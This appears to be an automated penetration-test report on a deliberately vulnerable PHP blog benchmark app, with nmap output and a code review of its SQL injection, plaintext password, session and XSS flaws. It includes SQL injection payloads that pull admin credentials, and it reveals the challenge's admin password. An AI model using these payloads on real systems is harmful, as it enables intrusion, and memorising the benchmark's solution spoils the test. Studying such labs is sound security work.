# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-30 17:26 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000029s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-server-header: Caddy
|_http-title: Site doesn't have a title.
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 2.3.4
9999/tcp  open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Content-Type: text/plain
|     Date: Fri, 31 Oct 2025 00:26:28 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 00:26:28 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 00:26:33 GMT
|_    Connection: close
49152/tcp open  http      Golang net/http server
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 31 Oct 2025 00:26:28 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.97%I=7%D=10/30%Time=69040234%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,E5,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\n
SF:Access-Control-Allow-Headers:\x20Content-Type\r\nContent-Type:\x20text/
SF:plain\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2000:26:28\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\nOK")%r(HTTPOptions,C9,"HTTP/1\.1\x20200\x20OK\r\
SF:nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x2
SF:0GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content-T
SF:ype\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2000:26:28\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(FourOhFourRequest,E5,"HTTP/1\.1\x20200\x20OK\
SF:r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\
SF:x20GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content
SF:-Type\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2031\x20Oct\x202
SF:025\x2000:26:28\x20GMT\r\nConnection:\x20close\r\n\r\nOK")%r(JavaRMI,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,C9,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\
SF:nAccess-Control-Allow-Headers:\x20Content-Type\r\nDate:\x20Fri,\x2031\x
SF:20Oct\x202025\x2000:26:33\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49152-TCP:V=7.97%I=7%D=10/30%Time=69040234%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Fri,\x2031\x20Oct\x202025\x2000:26:28\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Fri,\x2031\x20Oct\
SF:x202025\x2000:26:28\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Fri,\x2031\x20Oct\x202025\x2000:26:28\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds


## Subdomain Discovery (subfinder)
Status: success
[object Object]

## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:51233[0m [200 OK] [1mApache[0m[[1m[32m2.4.54[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.54 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPHP[0m[[1m[32m7.4.33[0m], [1mTitle[0m[[1m[33mBlog Home[0m], [1mX-Powered-By[0m[[0m[22mPHP/7.4.33[0m]

## Code Analysis
# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), verification confirms it meets the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints accessible via HTTP on port 51233
- Endpoints requiring authentication via the application's standard login mechanisms (admin.php)
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- Command-line interface (e.g., database initialization scripts via mysql CLI)
- Development environment's internal tooling (e.g., docker-compose commands)
- CI/CD pipeline scripts or build tools (Dockerfile build process)
- Database migration scripts executed during container startup (entrypoint.sh)
- Local development servers, test harnesses, or debugging utilities
- Static configuration files not served by the web application

---

## 1. Executive Summary

This is a **deliberately vulnerable PHP-based blog application** running on a traditional LAMP stack (Linux-Apache-MySQL-PHP) deployed via Docker Compose. The application exposes a minimal attack surface with only two primary web pages, yet demonstrates **critical security vulnerabilities across every major security domain**: authentication, data protection, input validation, and secure communications.

The security posture is **critically compromised** with multiple high-severity vulnerabilities that enable complete application compromise through various attack vectors. The most critical findings include: an **unauthenticated SQL injection vulnerability** in the public blog interface (index.php line 41) allowing direct database access, **plaintext password storage** in the admins table enabling immediate credential compromise, **complete absence of encryption** at all layers (transport, storage, and communication), and **hardcoded credentials** throughout the codebase and infrastructure configuration files committed to version control.

The application is accessible via HTTP on port 51233 (mapped from container port 80) with no TLS/SSL protection, exposing all authentication credentials, session cookies, and sensitive data to network interception. The architecture follows a two-tier monolithic pattern with a single web/application container directly connecting to a MySQL 5.7 database container, both running end-of-life software versions (PHP 7.4.33 EOL November 2022, MySQL 5.7 EOL October 2023) with no available security patches. The absence of security middleware, rate limiting, CSRF protection, output encoding, and security headers creates a trivially exploitable attack surface that would allow an external attacker with basic security knowledge to achieve full administrative access, extract sensitive data, inject malicious content, and potentially compromise the underlying infrastructure through multiple independent attack paths.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **PHP 7.4.33** (End-of-Life: November 28, 2022) running on **Apache 2.4.54 (Debian)** as the web server. The PHP runtime is configured with the **MySQLi extension** for database connectivity and the **mod_rewrite** Apache module enabled. The application consists of only two primary PHP files (`index.php` at 83 lines and `admin.php` at 59 lines), representing a minimal codebase with no external framework dependencies, no Composer packages, and no third-party libraries. This creates a custom-built application without the security benefits of established frameworks.

**Security Implications:** The use of PHP 7.4.33, which reached end-of-life in November 2022, means **no security patches are available** for any discovered vulnerabilities. This exposes the application to all known PHP 7.4 exploits without remediation options. The Apache configuration reveals exact version information via HTTP response headers (`Server: Apache/2.4.54 (Debian)` and `X-Powered-By: PHP/7.4.33`), providing attackers with precise intelligence for targeting known vulnerabilities. The absence of any security framework or library means all security controls must be manually implemented, and the analysis confirms these are largely absent or inadequately implemented. The application relies solely on basic PHP features and the MySQLi extension without prepared statement usage, input validation frameworks, or output encoding utilities.

**Critical Configuration Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/Dockerfile` - Defines PHP 7.4-apache base image, enables dangerous error display settings (`display_errors = On`, `display_startup_errors = On`, `error_reporting = E_ALL`), and injects the FLAG via build-time argument replacement
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/000-default.conf` - Apache VirtualHost configuration listening only on HTTP port 80, enabling dangerous directory listing (`Options Indexes`), and lacking all security headers
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` - Infrastructure orchestration exposing application on host port 51233, containing **hardcoded database credentials in plaintext** (`MYSQL_ROOT_PASSWORD: rootpassword`, `MYSQL_PASSWORD: password`)

### Architectural Pattern

The application follows a **two-tier monolithic architecture** deployed as containerized services via Docker Compose. The architecture consists of two Docker containers: (1) **Web/Application Tier** (`xben-040-24_web_1`) handling HTTP requests on port 51233 (mapped to container port 80), executing PHP business logic, and serving static assets, and (2) **Database Tier** (`xben-040-24_db_1`) running MySQL 5.7 on internal port 3306 (not exposed to the host). The containers communicate over an internal Docker network with the web container depending on database availability via the `depends_on` directive.

**Trust Boundary Analysis:** The primary trust boundary exists at the HTTP endpoint (port 51233) where external untrusted input enters the application through GET/POST parameters and HTTP headers. A secondary internal trust boundary separates the web container from the database container, though this boundary provides minimal security value since **both containers share the same internal network** and the web application possesses full database credentials. The architecture demonstrates **implicit trust of all database content**, rendering data directly to HTML without sanitization, creating stored XSS vulnerabilities. There is **no authentication gateway, WAF, or reverse proxy** layer before the application, meaning all requests reach the PHP application directly without filtering or rate limiting.

**Security Implications:** This monolithic two-tier pattern creates a **single point of failure** with no redundancy, load balancing, or service mesh protection. The direct coupling between the web application and database means a compromise of the web tier immediately grants database access using the hardcoded credentials. The absence of a reverse proxy, API gateway, or web application firewall means there is **no defense in depth**—the PHP application is the only security control between external attackers and the database. The internal Docker network provides network isolation from external access to the database, preventing direct external database connections, but this protection is nullified once an attacker exploits the web application (via SQL injection or authentication bypass) since the web container has unrestricted database access.

**Application Flow:**
```
External Request (Port 51233, HTTP only)
  ↓ [No TLS, No WAF, No Rate Limiting]
Apache Web Server (Container Port 80)
  ↓ [No security headers, Directory listing enabled]
PHP Processor (7.4.33 EOL, Errors displayed to users)
  ↓ [Hardcoded credentials: mysqli('db', 'user', 'password', 'blogDB')]
MySQL Database (db:3306, mysql_native_password)
  ↓ [Plaintext storage, No encryption, Weak auth plugin]
Database Files (Unencrypted at rest)
```

### Critical Security Components

The application **lacks modern security components** expected in production environments. There is **no web application firewall (WAF)**, no intrusion detection/prevention system, no rate limiting middleware, no CSRF protection mechanism, and no security header configuration. The security architecture relies entirely on **basic input escaping** via `mysqli_real_escape_string()` (applied inconsistently) and **default PHP session management** without hardening.

**Present Security Mechanisms (Minimal):**
1. **Session Management** (`admin.php` line 2): Basic `session_start()` with no security configuration—no HttpOnly flag, no Secure flag, no SameSite attribute, no session timeout, and no session regeneration after authentication, creating session fixation vulnerabilities
2. **Input Escaping** (inconsistent): `mysqli_real_escape_string()` used in some locations (`admin.php` lines 17-18, `index.php` line 52) but **critically absent** in the first query in `index.php` line 41, and escaping alone is insufficient protection against SQL injection compared to prepared statements
3. **Published Flag Filtering**: Blog posts query includes `WHERE published = 1` (line 56), providing minimal content control but no security benefit
4. **Container Health Checks** (`docker-compose.yml` lines 13-16, 35-38): Monitoring container availability but exposing database password in healthcheck command visible in process list

**Absent Critical Security Components:**
- **No TLS/SSL**: Application serves only HTTP on port 80, transmitting credentials and session tokens in plaintext
- **No Security Headers**: Missing X-Frame-Options, Content-Security-Policy, X-XSS-Protection, Strict-Transport-Security, X-Content-Type-Options
- **No CSRF Protection**: Forms lack anti-CSRF tokens, no SameSite cookie attribute
- **No Rate Limiting**: Login endpoint vulnerable to brute-force attacks with no throttling
- **No Input Validation Framework**: No type checking, length restrictions, or whitelist validation
- **No Output Encoding**: Zero usage of `htmlspecialchars()`, `htmlentities()`, or any XSS prevention
- **No WAF or Filtering Layer**: Direct exposure of PHP application to internet traffic
- **No Audit Logging**: No recording of authentication attempts, query execution, or security events
- **No Secrets Management**: All credentials hardcoded in source files committed to version control

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

The application implements a **basic form-based authentication system** with **critically inadequate security controls**. Authentication occurs via HTTP POST to `/admin.php` (lines 11-30) where submitted credentials are compared **directly in plaintext** against database values without any hashing, salting, or key derivation functions.

**Authentication Flow:**
1. **Credential Submission** (`admin.php` lines 11-18): User submits username and password via POST request over **unencrypted HTTP**, exposing credentials to network interception
2. **Input Processing** (lines 17-18): Credentials are escaped using `mysqli_real_escape_string()` (insufficient protection) with explicit comment `//plaintext` acknowledging the security failure
3. **Database Query** (line 20): Direct SQL query with string concatenation: `SELECT id FROM admins WHERE username = '$username' AND password = '$password'`
4. **Authentication Decision** (lines 23-28): If exactly one matching row is found, `$_SESSION['admin_logged_in']` is set to `true` and the FLAG is revealed

**Critical Vulnerabilities:**

**1. Plaintext Password Storage (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` line 32, `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` line 18
- Passwords stored in database `admins` table without any hashing—the `password` column contains literal plaintext passwords
- Authentication query compares plaintext input directly with plaintext database value: `password = '$password'`
- **No use of** `password_hash()`, bcrypt, Argon2, PBKDF2, or any cryptographic hashing algorithm
- **Impact:** Any database compromise (via SQL injection, backup theft, or container access) immediately exposes all passwords with zero computational cost to attacker

**2. Default Credentials Hardcoded in Repository (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql` line 58
- Database initialization script contains: `INSERT INTO admins (username, password) VALUES ('admin', 'ONEverySecurePassword_!');`
- These credentials are **committed to version control** and executed on every container initialization
- **Impact:** Any attacker with repository access or who discovers the default credentials can immediately authenticate as admin

**3. SQL Injection in Authentication (HIGH):**
- **Location:** `admin.php` line 20
- Despite using `mysqli_real_escape_string()`, the query uses string concatenation instead of prepared statements
- **Vulnerable pattern:** `$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";`
- Escaping is not a complete defense against encoding-based SQL injection attacks
- **Impact:** Potential authentication bypass via SQL injection techniques that circumvent escaping

**4. Credentials Transmitted Over HTTP (CRITICAL):**
- **Location:** All authentication occurs over unencrypted HTTP (Apache config port 80 only)
- Username and password transmitted in plaintext POST body
- **Impact:** Network sniffing, man-in-the-middle attacks, ISP logging can capture credentials

**Authentication API Endpoints:**
- **POST /admin.php** - Primary login endpoint accepting `username` and `password` parameters, no rate limiting, no CAPTCHA, no MFA, vulnerable to brute-force attacks
- **GET /admin.php** - Displays login form or FLAG if already authenticated via session check (lines 4-8)
- **No logout endpoint** - Sessions cannot be explicitly terminated, they persist indefinitely
- **No password reset endpoint** - No account recovery mechanism
- **No token refresh endpoint** - No JWT or OAuth token flow, pure session-based authentication

### Session Management and Token Security

**Session Initialization:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` line 2
- Basic `session_start()` call with **zero security configuration**

**Session Cookie Configuration - CRITICAL SECURITY FAILURE:**

The application **does not configure session cookie security flags** anywhere in the codebase. No calls to `session_set_cookie_params()` exist, meaning PHP uses dangerous default settings:

- **Missing `HttpOnly` flag:** Session cookies are accessible via JavaScript, creating vulnerability to XSS-based session theft. If the identified XSS vulnerabilities in `index.php` (lines 29, 68-73) are exploited, an attacker can execute `document.cookie` to steal `PHPSESSID` values.
- **Missing `Secure` flag:** Session cookies are transmitted over HTTP without TLS/SSL encryption, exposing session tokens to network interception via packet sniffing or man-in-the-middle attacks.
- **Missing `SameSite` attribute:** Sessions vulnerable to Cross-Site Request Forgery (CSRF) attacks since cookies are sent with cross-origin requests.
- **No custom session configuration:** No PHP.ini customization, no `.htaccess` security directives, no programmatic session hardening.

**Session Fixation Vulnerability (MEDIUM):**
- **Location:** `admin.php` line 25
- After successful authentication, the code sets `$_SESSION['admin_logged_in'] = true` **without calling `session_regenerate_id()`**
- **Attack:** Attacker can create a session ID, trick victim into using it (via URL parameter or cookie injection), then gain authenticated access when victim logs in with that session
- **Correct implementation (absent):** Should call `session_regenerate_id(true)` immediately after line 23 to destroy old session and create new ID

**Session Timeout - ABSENT:**
- No session expiration mechanism implemented
- No `session.gc_maxlifetime` configuration found
- No manual timeout checking in code
- **Impact:** Sessions persist indefinitely, even after browser close (depending on cookie expiration), increasing window for session hijacking

**Session Storage:**
- Uses default PHP session storage (typically `/tmp` or `/var/lib/php/sessions`)
- No session encryption at rest
- Session data stored in plaintext files on container filesystem

**Session Variables:**
- **Location:** `admin.php` lines 5, 25
- Only stores `$_SESSION['admin_logged_in'] = true` (boolean flag)
- **No user identification:** Does not store user ID, username, role, or IP address for verification
- **Weak verification:** Simple boolean check `$_SESSION['admin_logged_in'] === true` is the only authorization control

### Authorization Model and Potential Bypass Scenarios

The application implements a **binary authorization model** with only two states: unauthenticated (default) and authenticated admin (after login). There is **no role-based access control (RBAC)**, no permission granularity, and no attribute-based access control (ABAC).

**Authorization Implementation:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/admin.php` lines 4-8
```php
if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    echo "@FLAG@";
    exit;
}
```

**Authorization Control:** A single boolean session variable `admin_logged_in` determines access to protected resources (the FLAG).

**Bypass Scenarios:**

**1. SQL Injection Bypass (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 41
- The unauthenticated SQL injection vulnerability allows direct database manipulation
- **Attack:** Inject SQL to read `admins` table: `GET /?category=' UNION SELECT username,password,1,2,3,4,5 FROM admins--`
- **Result:** Obtain plaintext admin credentials, then authenticate legitimately

**2. Session Fixation Bypass (MEDIUM):**
- Attacker creates session with known ID, victim authenticates using that session
- Attacker then uses the same session ID to access FLAG without credentials

**3. Session Prediction/Hijacking (MEDIUM):**
- If session IDs are predictable or can be stolen via XSS (due to missing HttpOnly flag)
- Network sniffing of session cookies transmitted over HTTP

**4. Direct Database Access (CRITICAL if achieved):**
- If attacker gains direct database access via SQL injection or container compromise
- Could modify `admins` table to insert known credentials or modify existing password

**Authorization Checks - Present in:**
- `admin.php` lines 4-8 (session check before FLAG display)

**Authorization Checks - Absent in:**
- No authorization checks on `index.php` (public blog page, expected)
- No API endpoints with authorization requirements (none exist)
- No administrative functions beyond FLAG display

### Multi-Tenancy Security Implementation

**NOT APPLICABLE:** This is a **single-tenant application** with no multi-tenancy architecture.

**Evidence:**
- Single `admins` table with one hardcoded admin user
- No `tenant_id`, `organization_id`, or similar columns in any database table
- No tenant isolation logic in queries
- No tenant context in sessions
- Blog posts table (`posts`) has no owner or tenant association—all posts are globally visible when `published = 1`

**Database Schema Analysis:**
- `posts` table (lines 9-17 of `db_init.sql`): No user ownership column, no tenant scoping
- `comments` table (lines 20-26): No user attribution, only `post_id` foreign key
- `admins` table (lines 29-33): Single admin user, no multi-user support

### SSO/OAuth/OIDC Flows

**NOT IMPLEMENTED:** The application does **not integrate with any external authentication providers**.

**Searched for:** OAuth, OIDC, SAML, SSO, JWT, token endpoints, callback handlers, state parameter validation, nonce validation
**Result:** No evidence of federated authentication

**Authentication Method:** Pure form-based local authentication with database credential verification only

**Missing Components:**
- No OAuth authorization endpoints
- No OIDC discovery or callback endpoints
- No SAML metadata processing
- No JWT token generation or validation
- No `state` parameter CSRF protection for OAuth flows
- No `nonce` parameter validation for OIDC

**Impact:** Application cannot leverage enterprise SSO solutions, centralized identity management, or multi-factor authentication provided by external identity providers.

---

## 4. Data Security & Storage

### Database Security

The application uses **MySQL 5.7** (End-of-Life: October 21, 2023) with **critically inadequate security controls** across encryption, access control, and query safety.

**Database Configuration:**
- **Image:** `mysql:5.7` with forced `linux/amd64` platform (`docker-compose.yml` lines 3-4)
- **Authentication Plugin:** `mysql_native_password` (legacy, insecure) configured via `--default-authentication-plugin` in line 5
- **Credentials Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/docker-compose.yml` lines 6-10
  - `MYSQL_ROOT_PASSWORD: rootpassword` (weak, predictable, hardcoded)
  - `MYSQL_USER: user`, `MYSQL_PASSWORD: password` (trivial credentials)
  - **All credentials committed to version control in plaintext**

**Encryption - COMPLETELY ABSENT:**

**1. No Data-at-Rest Encryption:**
- MySQL database files stored **unencrypted** on container filesystem
- No `mysql-encryption` plugin enabled
- No Transparent Data Encryption (TDE)
- No encrypted tablespaces
- **Impact:** Container filesystem access or backup theft exposes entire database in plaintext

**2. No Data-in-Transit Encryption:**
- **Location:** `index.php` line 2, `admin.php` line 12
- Connection string: `new mysqli('db', 'user', 'password', 'blogDB')`
- **No SSL/TLS configuration:** Connection lacks `MYSQLI_CLIENT_SSL` flag
- MySQL server not configured with `--require_secure_transport`
- **Impact:** Database credentials and query results transmitted in plaintext over Docker internal network (mitigated partially by network isolation, but vulnerable if attacker gains container access)

**3. No Field-Level Encryption:**
- Sensitive columns like `admins.password` stored in plaintext
- No application-level encryption before database storage
- No use of MySQL encryption functions (`AES_ENCRYPT`, `AES_DECRYPT`)

**Access Controls:**

**MySQL User Privileges (Inadequate):**
- **Application User:** `user` with password `password` (lines 9-10)
- **Likely Privileges:** Full access to `blogDB` database (no explicit GRANT restrictions in code)
- **No Principle of Least Privilege:** Single user account for all operations (SELECT, INSERT, UPDATE, DELETE)
- **No Separation:** No read-only vs. read-write user distinction
- **Root User Exposed:** Root password `rootpassword` hardcoded and visible

**Query Safety (CRITICAL FAILURES):**

**SQL Injection Vulnerability #1 (CRITICAL):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/html/index.php` line 41
```php
$unescaped_category = isset($_GET['category']) ? $_GET['category'] : '';
$result = $conn->query("SELECT DISTINCT category FROM posts where category = '" . $unescaped_category . "'");
```
- **Direct concatenation of unescaped user input** from GET parameter
- **Exploitation:** `GET /?category=' OR '1'='1` bypasses validation
- **Database Compromise:** `GET /?category=' UNION SELECT username,password,1,2,3,4,5 FROM admins--` extracts credentials
- **Impact:** Complete database read access, potential write access via `UNION` injection with `INSERT`/`UPDATE` stacked queries

**SQL Injection Vulnerability #2 (HIGH):**
- **Location:** `admin.php` line 20, `index.php` lines 52-58
- Uses `mysqli_real_escape_string()` but still employs **string concatenation** instead of prepared statements
- **Example:** `$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";`
- **Weakness:** Escaping is NOT complete protection—vulnerable to encoding attacks, charset manipulation, and second-order injection
- **Correct approach (absent):** Prepared statements with parameter binding using `prepare()`, `bind_param()`, `execute()`

**Prepared Statements Analysis:**
- **Searched codebase for:** `prepare`, `bind_param`, `execute`, `PDO`
- **Result:** **ZERO prepared statements in entire application**
- **Impact:** All database queries use dangerous string concatenation vulnerable to SQLi

**Database Schema Security:**
- **Schema File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-040-24/app/db_init.sql`
- **Admins Table** (lines 29-33): `password VARCHAR(255)` without hash storage, no `salt` column
- **Foreign Key Constraints:** Present (`comments.post_id` references `posts.id` with `ON DELETE CASCADE`), providing referential integrity but no security benefit
- **No Row-Level Security:** No tenant isolation or user-based access filtering at database level

### Data Flow Security

**Sensitive Data Paths:**

**1. Authentication Credential Flow:**
```
User Browser (Plaintext Form)
  ↓ [HTTP POST, No TLS]
Apache :80 (Cleartext reception)
  ↓ [No encryption]
admin.php:17-18 (mysqli_real_escape_string on plaintext)
  ↓ [Plaintext SQL query]
MySQL :3306 (Unencrypted connection)
  ↓ [Plaintext storage]
admins table password column (Plaintext VARCHAR)
```

**2. Session Token Flow:**
```
PHP session_start() (admin.php:2)
  ↓ [No security flags set]
PHPSESSID cookie generation
  ↓ [HTTP, No Secure flag, No HttpOnly]
User Browser (Cookie storage)
  ↓ [Subsequent requests, No TLS]
Apache :80 (Cookie transmitted in cleartext)
  ↓ [Session file read]
Container /tmp or /var/lib/php/sessions (Plaintext)
```

**3. Blog Content Flow (XSS Risk):**
```
Database posts table (Attacker-controlled content)
  ↓ [No sanitization]
index.php:68-73 (Direct echo without htmlspecialchars)
  ↓ [Unescaped HTML]
User Browser (XSS execution)
```

**Protection Mechanisms:**
- **Present:** `mysqli_real_escape_string()` applied to category parameter (line 52, but AFTER vulnerable query at line 41) and login parameters (lines 17-18)
- **Absent:** No `htmlspecialchars()`, no `htmlentities()`, no input validation, no type checking, no length restrictions, no Content-Security-Policy headers, no output encoding framework

**Data Exposure Points:**
1. **PHP Error Messages** (Dockerfile lines 9-13): `display_errors = On` exposes database connection errors, SQL query errors, file paths, and stack traces to users—aids reconnaissance
